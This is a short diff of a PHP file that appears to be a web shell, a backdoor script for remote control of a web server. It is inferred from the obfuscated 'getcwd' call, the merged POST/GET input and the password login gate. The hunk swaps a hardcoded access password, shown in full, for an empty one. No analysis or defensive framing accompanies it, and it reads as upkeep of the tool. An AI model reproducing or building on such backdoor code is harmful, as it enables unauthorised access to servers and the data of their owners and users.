@@ -33,7 +33,7 @@ $Array = [
 	$_7 = array_merge($_POST, $_GET);
 	$_r = "required='required'";
 	$gcw = "getcwd";
-	$correctPassword = "jagahati12@#..4"; //Change Password
+	$correctPassword = ""; //Change Password
 	if (isset($_POST['pass'])) {
 		$enteredPassword = $_POST['pass'];
 
